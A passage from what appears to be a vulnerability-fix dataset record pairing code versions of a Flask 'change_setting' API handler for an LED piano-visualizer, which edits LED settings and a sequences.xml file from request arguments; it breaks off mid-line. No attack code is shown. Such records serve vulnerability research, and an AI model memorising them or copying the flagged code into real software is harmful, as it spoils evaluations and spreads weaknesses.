webinterface.usersettings.change_setting_value(\"start_point\", webinterface.learning.start_point)\n        webinterface.learning.restart_learning()\n\n        return jsonify(success=True)\n\n    if setting_name == \"learning_end_point\":\n        value = int(value)\n        webinterface.learning.end_point = value\n        webinterface.learning.end_point = clamp(webinterface.learning.end_point, webinterface.learning.start_point + 1, 100)\n        webinterface.usersettings.change_setting_value(\"end_point\", webinterface.learning.end_point)\n        webinterface.learning.restart_learning()\n\n        return jsonify(success=True)\n\n    if setting_name == \"set_current_time_as_start_point\":\n        webinterface.learning.start_point = round(float(webinterface.learning.current_idx * 100 / float(len(webinterface.learning.song_tracks))), 3)\n        webinterface.learning.start_point = clamp(webinterface.learning.start_point, 0, webinterface.learning.end_point - 1)\n        webinterface.usersettings.change_setting_value(\"start_point\", webinterface.learning.start_point)\n        webinterface.learning.restart_learning()\n\n        return jsonify(success=True, reload_learning_settings=True)\n\n    if setting_name == \"set_current_time_as_end_point\":\n        webinterface.learning.end_point = round(float(webinterface.learning.current_idx * 100 / float(len(webinterface.learning.song_tracks))), 3)\n        webinterface.learning.end_point = clamp(webinterface.learning.end_point, webinterface.learning.start_point + 1, 100)\n        webinterface.usersettings.change_setting_value(\"end_point\", webinterface.learning.end_point)\n        webinterface.learning.restart_learning()\n\n        return jsonify(success=True, reload_learning_settings=True)\n\n    if setting_name == \"change_handL_color\":\n        value = int(value)\n        webinterface.learning.hand_colorL += value\n        webinterface.learning.hand_colorL = clamp(webinterface.learning.hand_colorL, 0, len(webinterface.learning.hand_colorList) - 1)\n        webinterface.usersettings.change_setting_value(\"hand_colorL\", webinterface.learning.hand_colorL)\n\n        return jsonify(success=True, reload_learning_settings=True)\n\n    if setting_name == \"change_handR_color\":\n        value = int(value)\n        webinterface.learning.hand_colorR += value\n        webinterface.learning.hand_colorR = clamp(webinterface.learning.hand_colorR, 0, len(webinterface.learning.hand_colorList) - 1)\n        webinterface.usersettings.change_setting_value(\"hand_colorR\", webinterface.learning.hand_colorR)\n\n        return jsonify(success=True, reload_learning_settings=True)\n\n    if setting_name == \"change_learning_loop\":\n        value = int(value == 'true')\n        webinterface.learning.is_loop_active = value\n        webinterface.usersettings.change_setting_value(\"is_loop_active\", webinterface.learning.is_loop_active)\n\n        return jsonify(success=True)\n\n\n    return jsonify(success=True)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_105_1",
        "commit": "3f10602",
        "file_path": "webinterface/views_api.py",
        "start_line": "146",
        "end_line": "1115",
        "snippet": "def change_setting():\n    setting_name = request.args.get('setting_name')\n    value = request.args.get('value')\n    second_value = request.args.get('second_value')\n    disable_sequence = request.args.get('disable_sequence')\n\n    reload_sequence = True\n    if (second_value == \"no_reload\"):\n        reload_sequence = False\n\n    if (disable_sequence == \"true\"):\n        webinterface.ledsettings.__init__(webinterface.usersettings)\n        webinterface.ledsettings.sequence_active = False\n\n    if setting_name == \"clean_ledstrip\":\n        fastColorWipe(webinterface.ledstrip.strip, True, webinterface.ledsettings)\n\n    if setting_name == \"led_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n\n        webinterface.ledsettings.color_mode = \"Single\"\n\n        webinterface.ledsettings.red = rgb[0]\n        webinterface.ledsettings.green = rgb[1]\n        webinterface.ledsettings.blue = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"color_mode\", webinterface.ledsettings.color_mode)\n        webinterface.usersettings.change_setting_value(\"red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"light_mode\":\n        webinterface.ledsettings.mode = value\n        webinterface.usersettings.change_setting_value(\"mode\", value)\n\n    if setting_name == \"fading_speed\" or setting_name == \"velocity_speed\":\n        webinterface.ledsettings.fadingspeed = int(value)\n        webinterface.usersettings.change_setting_value(\"fadingspeed\", webinterface.ledsettings.fadingspeed)\n\n    if setting_name == \"brightness\":\n        webinterface.usersettings.change_setting_value(\"brightness_percent\", int(value))\n        webinterface.ledstrip.change_brightness(int(value), True)\n\n    if setting_name == \"backlight_brightness\":\n        webinterface.ledsettings.backlight_brightness_percent = int(value)\n        webinterface.ledsettings.backlight_brightness = 255 * webinterface.ledsettings.backlight_brightness_percent / 100\n        webinterface.usersettings.change_setting_value(\"backlight_brightness\",\n                                                       int(webinterface.ledsettings.backlight_brightness))\n        webinterface.usersettings.change_setting_value(\"backlight_brightness_percent\",\n                                                       webinterface.ledsettings.backlight_brightness_percent)\n        fastColorWipe(webinterface.ledstrip.strip, True, webinterface.ledsettings)\n\n    if setting_name == \"backlight_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n\n        webinterface.ledsettings.backlight_red = rgb[0]\n        webinterface.ledsettings.backlight_green = rgb[1]\n        webinterface.ledsettings.backlight_blue = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"backlight_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"backlight_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"backlight_blue\", rgb[2])\n\n        fastColorWipe(webinterface.ledstrip.strip, True, webinterface.ledsettings)\n\n    if setting_name == \"sides_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n\n        webinterface.ledsettings.adjacent_red = rgb[0]\n        webinterface.ledsettings.adjacent_green = rgb[1]\n        webinterface.ledsettings.adjacent_blue = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"adjacent_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"adjacent_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"adjacent_blue\", rgb[2])\n\n    if setting_name == \"sides_color_mode\":\n        webinterface.ledsettings.adjacent_mode = value\n        webinterface.usersettings.change_setting_value(\"adjacent_mode\", value)\n\n    if setting_name == \"input_port\":\n        webinterface.usersettings.change_setting_value(\"input_port\", value)\n        webinterface.midiports.change_port(\"inport\", value)\n\n    if setting_name == \"secondary_input_port\":\n        webinterface.usersettings.change_setting_value(\"secondary_input_port\", value)\n\n    if setting_name == \"play_port\":\n        webinterface.usersettings.change_setting_value(\"play_port\", value)\n        webinterface.midiports.change_port(\"playport\", value)\n\n    if setting_name == \"skipped_notes\":\n        webinterface.usersettings.change_setting_value(\"skipped_notes\", value)\n        webinterface.ledsettings.skipped_notes = value\n\n    if setting_name == \"add_note_offset\":\n        webinterface.ledsettings.add_note_offset()\n        return jsonify(success=True, reload=True)\n\n    if setting_name == \"append_note_offset\":\n        webinterface.ledsettings.append_note_offset()\n        return jsonify(success=True, reload=True)\n\n    if setting_name == \"remove_note_offset\":\n        webinterface.ledsettings.del_note_offset(int(value) + 1)\n        return jsonify(success=True, reload=True)\n\n    if setting_name == \"note_offsets\":\n        webinterface.usersettings.change_setting_value(\"note_offsets\", value)\n\n    if setting_name == \"update_note_offset\":\n        webinterface.ledsettings.update_note_offset(int(value) + 1, second_value)\n        return jsonify(success=True, reload=True)\n\n    if setting_name == \"led_count\":\n        webinterface.usersettings.change_setting_value(\"led_count\", int(value))\n        webinterface.ledstrip.change_led_count(int(value), True)\n\n    if setting_name == \"shift\":\n        webinterface.usersettings.change_setting_value(\"shift\", int(value))\n        webinterface.ledstrip.change_shift(int(value), True)\n\n    if setting_name == \"reverse\":\n        webinterface.usersettings.change_setting_value(\"reverse\", int(value))\n        webinterface.ledstrip.change_reverse(int(value), True)\n\n    if setting_name == \"color_mode\":\n        reload_sequence = True\n        if (second_value == \"no_reload\"):\n            reload_sequence = False\n\n        webinterface.ledsettings.color_mode = value\n        webinterface.usersettings.change_setting_value(\"color_mode\", webinterface.ledsettings.color_mode)\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"add_multicolor\":\n        webinterface.ledsettings.addcolor()\n        return jsonify(success=True, reload=True)\n\n    if setting_name == \"add_multicolor_and_set_value\":\n        settings = json.loads(value)\n\n        webinterface.ledsettings.multicolor.clear()\n        webinterface.ledsettings.multicolor_range.clear()\n\n        for key, value in settings.items():\n            rgb = wc.hex_to_rgb(\"#\" + value[\"color\"])\n\n            webinterface.ledsettings.multicolor.append([int(rgb[0]), int(rgb[1]), int(rgb[2])])\n            webinterface.ledsettings.multicolor_range.append([int(value[\"range\"][0]), int(value[\"range\"][1])])\n\n        webinterface.usersettings.change_setting_value(\"multicolor\", webinterface.ledsettings.multicolor)\n        webinterface.usersettings.change_setting_value(\"multicolor_range\",\n                                                       webinterface.ledsettings.multicolor_range)\n\n        return jsonify(success=True)\n\n    if setting_name == \"remove_multicolor\":\n        webinterface.ledsettings.deletecolor(int(value) + 1)\n        return jsonify(success=True, reload=True)\n\n    if setting_name == \"multicolor\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.multicolor[int(second_value)][0] = rgb[0]\n        webinterface.ledsettings.multicolor[int(second_value)][1] = rgb[1]\n        webinterface.ledsettings.multicolor[int(second_value)][2] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"multicolor\", webinterface.ledsettings.multicolor)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"multicolor_range_left\":\n        webinterface.ledsettings.multicolor_range[int(second_value)][0] = int(value)\n        webinterface.usersettings.change_setting_value(\"multicolor_range\", webinterface.ledsettings.multicolor_range)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"multicolor_range_right\":\n        webinterface.ledsettings.multicolor_range[int(second_value)][1] = int(value)\n        webinterface.usersettings.change_setting_value(\"multicolor_range\", webinterface.ledsettings.multicolor_range)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"remove_all_multicolors\":\n        webinterface.ledsettings.multicolor.clear()\n        webinterface.ledsettings.multicolor_range.clear()\n\n        webinterface.usersettings.change_setting_value(\"multicolor\", webinterface.ledsettings.multicolor)\n        webinterface.usersettings.change_setting_value(\"multicolor_range\", webinterface.ledsettings.multicolor_range)\n        return jsonify(success=True)\n\n    if setting_name == \"rainbow_offset\":\n        webinterface.ledsettings.rainbow_offset = int(value)\n        webinterface.usersettings.change_setting_value(\"rainbow_offset\",\n                                                       int(webinterface.ledsettings.rainbow_offset))\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"rainbow_scale\":\n        webinterface.ledsettings.rainbow_scale = int(value)\n        webinterface.usersettings.change_setting_value(\"rainbow_scale\",\n                                                       int(webinterface.ledsettings.rainbow_scale))\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"rainbow_timeshift\":\n        webinterface.ledsettings.rainbow_timeshift = int(value)\n        webinterface.usersettings.change_setting_value(\"rainbow_timeshift\",\n                                                       int(webinterface.ledsettings.rainbow_timeshift))\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"speed_slowest_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.speed_slowest[\"red\"] = rgb[0]\n        webinterface.ledsettings.speed_slowest[\"green\"] = rgb[1]\n        webinterface.ledsettings.speed_slowest[\"blue\"] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"speed_slowest_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"speed_slowest_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"speed_slowest_blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"speed_fastest_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.speed_fastest[\"red\"] = rgb[0]\n        webinterface.ledsettings.speed_fastest[\"green\"] = rgb[1]\n        webinterface.ledsettings.speed_fastest[\"blue\"] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"speed_fastest_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"speed_fastest_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"speed_fastest_blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"gradient_start_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.gradient_start[\"red\"] = rgb[0]\n        webinterface.ledsettings.gradient_start[\"green\"] = rgb[1]\n        webinterface.ledsettings.gradient_start[\"blue\"] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"gradient_start_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"gradient_start_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"gradient_start_blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"gradient_end_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.gradient_end[\"red\"] = rgb[0]\n        webinterface.ledsettings.gradient_end[\"green\"] = rgb[1]\n        webinterface.ledsettings.gradient_end[\"blue\"] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"gradient_end_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"gradient_end_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"gradient_end_blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"speed_max_notes\":\n        webinterface.ledsettings.speed_max_notes = int(value)\n        webinterface.usersettings.change_setting_value(\"speed_max_notes\", int(value))\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"speed_period_in_seconds\":\n        webinterface.ledsettings.speed_period_in_seconds = float(value)\n        webinterface.usersettings.change_setting_value(\"speed_period_in_seconds\", float(value))\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"key_in_scale_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.key_in_scale[\"red\"] = rgb[0]\n        webinterface.ledsettings.key_in_scale[\"green\"] = rgb[1]\n        webinterface.ledsettings.key_in_scale[\"blue\"] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"key_in_scale_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"key_in_scale_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"key_in_scale_blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"key_not_in_scale_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.key_not_in_scale[\"red\"] = rgb[0]\n        webinterface.ledsettings.key_not_in_scale[\"green\"] = rgb[1]\n        webinterface.ledsettings.key_not_in_scale[\"blue\"] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"key_not_in_scale_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"key_not_in_scale_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"key_not_in_scale_blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"scale_key\":\n        webinterface.ledsettings.scale_key = int(value)\n        webinterface.usersettings.change_setting_value(\"scale_key\", int(value))\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"next_step\":\n        webinterface.ledsettings.set_sequence(0, 1, False)\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"set_sequence\":\n        if (int(value) == 0):\n            webinterface.ledsettings.__init__(webinterface.usersettings)\n            webinterface.ledsettings.sequence_active = False\n        else:\n            webinterface.ledsettings.set_sequence(int(value) - 1, 0)\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"change_sequence_name\":\n        sequences_tree = minidom.parse(\"sequences.xml\")\n        sequence_to_edit = \"sequence_\" + str(value)\n\n        sequences_tree.getElementsByTagName(sequence_to_edit)[\n            0].getElementsByTagName(\"settings\")[\n            0].getElementsByTagName(\"sequence_name\")[0].firstChild.nodeValue = str(second_value)\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"change_step_value\":\n        sequences_tree = minidom.parse(\"sequences.xml\")\n        sequence_to_edit = \"sequence_\" + str(value)\n\n        sequences_tree.getElementsByTagName(sequence_to_edit)[\n            0].getElementsByTagName(\"settings\")[\n            0].getElementsByTagName(\"next_step\")[0].firstChild.nodeValue = str(second_value)\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"change_step_activation_method\":\n        sequences_tree = minidom.parse(\"sequences.xml\")\n        sequence_to_edit = \"sequence_\" + str(value)\n\n        sequences_tree.getElementsByTagName(sequence_to_edit)[\n            0].getElementsByTagName(\"settings\")[\n            0].getElementsByTagName(\"control_number\")[0].firstChild.nodeValue = str(second_value)\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"add_sequence\":\n        sequences_tree = minidom.parse(\"sequences.xml\")\n\n        sequences_amount = 1\n        while True:\n            if (len(sequences_tree.getElementsByTagName(\"sequence_\" + str(sequences_amount))) == 0):\n                break\n            sequences_amount += 1\n\n        settings = sequences_tree.createElement(\"settings\")\n\n        control_number = sequences_tree.createElement(\"control_number\")\n        control_number.appendChild(sequences_tree.createTextNode(\"0\"))\n        settings.appendChild(control_number)\n\n        next_step = sequences_tree.createElement(\"next_step\")\n        next_step.appendChild(sequences_tree.createTextNode(\"1\"))\n        settings.appendChild(next_step)\n\n        sequence_name = sequences_tree.createElement(\"sequence_name\")\n        sequence_name.appendChild(sequences_tree.createTextNode(\"Sequence \" + str(sequences_amount)))\n        settings.appendChild(sequence_name)\n\n        step = sequences_tree.createElement(\"step_1\")\n\n        color = sequences_tree.createElement(\"color\")\n        color.appendChild(sequences_tree.createTextNode(\"RGB\"))\n        step.appendChild(color)\n\n        red = sequences_tree.createElement(\"Red\")\n        red.appendChild(sequences_tree.createTextNode(\"255\"))\n        step.appendChild(red)\n\n        green = sequences_tree.createElement(\"Green\")\n        green.appendChild(sequences_tree.createTextNode(\"255\"))\n        step.appendChild(green)\n\n        blue = sequences_tree.createElement(\"Blue\")\n        blue.appendChild(sequences_tree.createTextNode(\"255\"))\n        step.appendChild(blue)\n\n        light_mode = sequences_tree.createElement(\"light_mode\")\n        light_mode.appendChild(sequences_tree.createTextNode(\"Normal\"))\n        step.appendChild(light_mode)\n\n        element = sequences_tree.createElement(\"sequence_\" + str(sequences_amount))\n        element.appendChild(settings)\n        element.appendChild(step)\n\n        sequences_tree.getElementsByTagName(\"list\")[0].appendChild(element)\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"remove_sequence\":\n        sequences_tree = minidom.parse(\"sequences.xml\")\n\n        # removing sequence node\n        nodes = sequences_tree.getElementsByTagName(\"sequence_\" + str(value))\n        for node in nodes:\n            parent = node.parentNode\n            parent.removeChild(node)\n\n        # changing nodes tag names\n        i = 1\n        for sequence in sequences_tree.getElementsByTagName(\"list\")[0].childNodes:\n            if (sequence.nodeType == 1):\n                sequences_tree.getElementsByTagName(sequence.nodeName)[0].tagName = \"sequence_\" + str(i)\n                i += 1\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"add_step\":\n        sequences_tree = minidom.parse(\"sequences.xml\")\n\n        step_amount = 1\n        while True:\n            if (len(sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].getElementsByTagName(\n                    \"step_\" + str(step_amount))) == 0):\n                break\n            step_amount += 1\n\n        step = sequences_tree.createElement(\"step_\" + str(step_amount))\n\n        color = sequences_tree.createElement(\"color\")\n\n        color.appendChild(sequences_tree.createTextNode(\"RGB\"))\n        step.appendChild(color)\n\n        red = sequences_tree.createElement(\"Red\")\n        red.appendChild(sequences_tree.createTextNode(\"255\"))\n        step.appendChild(red)\n\n        green = sequences_tree.createElement(\"Green\")\n        green.appendChild(sequences_tree.createTextNode(\"255\"))\n        step.appendChild(green)\n\n        blue = sequences_tree.createElement(\"Blue\")\n        blue.appendChild(sequences_tree.createTextNode(\"255\"))\n        step.appendChild(blue)\n\n        light_mode = sequences_tree.createElement(\"light_mode\")\n        light_mode.appendChild(sequences_tree.createTextNode(\"Normal\"))\n        step.appendChild(light_mode)\n\n        sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].appendChild(step)\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence, reload_steps_list=True)\n\n    # remove node list with a tag name \"step_\" + str(value), and change tag names to maintain order\n    if setting_name == \"remove_step\":\n\n        second_value = int(second_value)\n        second_value += 1\n\n        sequences_tree = minidom.parse(\"sequences.xml\")\n\n        # removing step node\n        nodes = sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].getElementsByTagName(\n            \"step_\" + str(second_value))\n        for node in nodes:\n            parent = node.parentNode\n            parent.removeChild(node)\n\n        # changing nodes tag names\n        i = 1\n        for step in sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].childNodes:\n            if (step.nodeType == 1 and step.tagName != \"settings\"):\n                sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].getElementsByTagName(step.nodeName)[\n                    0].tagName = \"step_\" + str(i)\n                i += 1\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    # saving current led settings as sequence step\n    if setting_name == \"save_led_settings_to_step\" and second_value != \"\":\n\n        # remove node and child under \"sequence_\" + str(value) and \"step_\" + str(second_value)\n        sequences_tree = minidom.parse(\"sequences.xml\")\n\n        second_value = int(second_value)\n        second_value += 1\n\n        nodes = sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].getElementsByTagName(\n            \"step_\" + str(second_value))\n        for node in nodes:\n            parent = node.parentNode\n            parent.removeChild(node)\n\n        # create new step node\n        step = sequences_tree.createElement(\"step_\" + str(second_value))\n\n        # load color mode from webinterface.ledsettings and put it into step node\n        color_mode = sequences_tree.createElement(\"color\")\n        color_mode.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.color_mode)))\n        step.appendChild(color_mode)\n\n        # load mode from webinterface.ledsettings and put it into step node\n        mode = sequences_tree.createElement(\"light_mode\")\n        mode.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.mode)))\n        step.appendChild(mode)\n\n        # if mode is equal \"Fading\" or \"Velocity\" load mode from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.mode == \"Fading\" or webinterface.ledsettings.mode == \"Velocity\"):\n            fadingspeed = sequences_tree.createElement(\"fadingspeed\")\n\n            # depending on fadingspeed name set different fadingspeed value\n            if (webinterface.ledsettings.fadingspeed == \"Slow\"):\n                fadingspeed.appendChild(sequences_tree.createTextNode(\"10\"))\n            elif (webinterface.ledsettings.fadingspeed == \"Medium\"):\n                fadingspeed.appendChild(sequences_tree.createTextNode(\"20\"))\n            elif (webinterface.ledsettings.fadingspeed == \"Fast\"):\n                fadingspeed.appendChild(sequences_tree.createTextNode(\"40\"))\n            elif (webinterface.ledsettings.fadingspeed == \"Very fast\"):\n                fadingspeed.appendChild(sequences_tree.createTextNode(\"50\"))\n            elif (webinterface.ledsettings.fadingspeed == \"Instant\"):\n                fadingspeed.appendChild(sequences_tree.createTextNode(\"1000\"))\n            elif (webinterface.ledsettings.fadingspeed == \"Very slow\"):\n                fadingspeed.appendChild(sequences_tree.createTextNode(\"2\"))\n\n            step.appendChild(fadingspeed)\n\n        # if color_mode is equal to \"Single\" load color from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.color_mode == \"Single\"):\n            red = sequences_tree.createElement(\"Red\")\n            red.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.red)))\n            step.appendChild(red)\n\n            green = sequences_tree.createElement(\"Green\")\n            green.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.green)))\n            step.appendChild(green)\n\n            blue = sequences_tree.createElement(\"Blue\")\n            blue.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.blue)))\n            step.appendChild(blue)\n\n        # if color_mode is equal to \"Multicolor\" load colors from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.color_mode == \"Multicolor\"):\n            # load value from webinterface.ledsettings.multicolor\n            multicolor = webinterface.ledsettings.multicolor\n\n            # loop through multicolor object and add each color to step node under \"sequence_\"+str(value) with tag name \"color_\"+str(i)\n            for i in range(len(multicolor)):\n                color = sequences_tree.createElement(\"color_\" + str(i + 1))\n                new_multicolor = str(multicolor[i])\n                new_multicolor = new_multicolor.replace(\"[\", \"\")\n                new_multicolor = new_multicolor.replace(\"]\", \"\")\n\n                color.appendChild(sequences_tree.createTextNode(new_multicolor))\n                step.appendChild(color)\n\n            # same as above but with multicolor_range and \"color_range_\"+str(i)\n            multicolor_range = webinterface.ledsettings.multicolor_range\n            for i in range(len(multicolor_range)):\n                color_range = sequences_tree.createElement(\"color_range_\" + str(i + 1))\n                new_multicolor_range = str(multicolor_range[i])\n\n                new_multicolor_range = new_multicolor_range.replace(\"[\", \"\")\n                new_multicolor_range = new_multicolor_range.replace(\"]\", \"\")\n                color_range.appendChild(sequences_tree.createTextNode(new_multicolor_range))\n                step.appendChild(color_range)\n\n        # if color_mode is equal to \"Rainbow\" load colors from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.color_mode == \"Rainbow\"):\n            # load values rainbow_offset, rainbow_scale and rainbow_timeshift from webinterface.ledsettings and put them into step node under Offset, Scale and Timeshift\n            rainbow_offset = sequences_tree.createElement(\"Offset\")\n            rainbow_offset.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.rainbow_offset)))\n            step.appendChild(rainbow_offset)\n\n            rainbow_scale = sequences_tree.createElement(\"Scale\")\n            rainbow_scale.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.rainbow_scale)))\n            step.appendChild(rainbow_scale)\n\n            rainbow_timeshift = sequences_tree.createElement(\"Timeshift\")\n            rainbow_timeshift.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.rainbow_timeshift)))\n            step.appendChild(rainbow_timeshift)\n\n        # if color_mode is equal to \"Speed\" load colors from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.color_mode == \"Speed\"):\n            # load values speed_slowest[\"red\"] etc from webinterface.ledsettings and put them under speed_slowest_red etc\n            speed_slowest_red = sequences_tree.createElement(\"speed_slowest_red\")\n            speed_slowest_red.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_slowest[\"red\"])))\n            step.appendChild(speed_slowest_red)\n\n            speed_slowest_green = sequences_tree.createElement(\"speed_slowest_green\")\n            speed_slowest_green.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_slowest[\"green\"])))\n            step.appendChild(speed_slowest_green)\n\n            speed_slowest_blue = sequences_tree.createElement(\"speed_slowest_blue\")\n            speed_slowest_blue.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_slowest[\"blue\"])))\n            step.appendChild(speed_slowest_blue)\n\n            # same as above but with \"fastest\"\n            speed_fastest_red = sequences_tree.createElement(\"speed_fastest_red\")\n            speed_fastest_red.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_fastest[\"red\"])))\n            step.appendChild(speed_fastest_red)\n\n            speed_fastest_green = sequences_tree.createElement(\"speed_fastest_green\")\n            speed_fastest_green.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_fastest[\"green\"])))\n            step.appendChild(speed_fastest_green)\n\n            speed_fastest_blue = sequences_tree.createElement(\"speed_fastest_blue\")\n            speed_fastest_blue.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_fastest[\"blue\"])))\n            step.appendChild(speed_fastest_blue)\n\n            # load \"speed_max_notes\" and \"speed_period_in_seconds\" values from webinterface.ledsettings\n            # and put them under speed_max_notes and speed_period_in_seconds\n\n            speed_max_notes = sequences_tree.createElement(\"speed_max_notes\")\n            speed_max_notes.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.speed_max_notes)))\n            step.appendChild(speed_max_notes)\n\n            speed_period_in_seconds = sequences_tree.createElement(\"speed_period_in_seconds\")\n            speed_period_in_seconds.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_period_in_seconds)))\n            step.appendChild(speed_period_in_seconds)\n\n        # if color_mode is equal to \"Gradient\" load colors from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.color_mode == \"Gradient\"):\n            # load values gradient_start_red etc from webinterface.ledsettings and put them under gradient_start_red etc\n            gradient_start_red = sequences_tree.createElement(\"gradient_start_red\")\n            gradient_start_red.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.gradient_start[\"red\"])))\n            step.appendChild(gradient_start_red)\n\n            gradient_start_green = sequences_tree.createElement(\"gradient_start_green\")\n            gradient_start_green.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.gradient_start[\"green\"])))\n            step.appendChild(gradient_start_green)\n\n            gradient_start_blue = sequences_tree.createElement(\"gradient_start_blue\")\n            gradient_start_blue.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.gradient_start[\"blue\"])))\n            step.appendChild(gradient_start_blue)\n\n            # same as above but with gradient_end\n            gradient_end_red = sequences_tree.createElement(\"gradient_end_red\")\n            gradient_end_red.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.gradient_end[\"red\"])))\n            step.appendChild(gradient_end_red)\n\n            gradient_end_green = sequences_tree.createElement(\"gradient_end_green\")\n            gradient_end_green.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.gradient_end[\"green\"])))\n            step.appendChild(gradient_end_green)\n\n            gradient_end_blue = 